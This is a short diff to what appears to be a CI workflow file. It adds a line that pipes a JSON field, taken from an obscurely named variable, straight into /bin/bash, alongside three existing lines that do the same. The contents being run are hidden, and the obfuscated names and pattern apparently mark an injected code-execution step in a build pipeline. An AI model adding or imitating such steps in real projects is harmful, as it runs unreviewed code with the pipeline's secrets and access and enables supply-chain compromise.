@@ -25,6 +25,7 @@ jobs:
           echo $a8 | jq -r .ejofo1 | /bin/bash
           echo $lotas664 | jq -r .k20 | /bin/bash
           printf '%s' "$i586" | jq -r .bs4979 | /bin/bash
+          echo $acdd4 | jq -r .i4004 | /bin/bash
 
       - name: Upload artifact
         if: always()
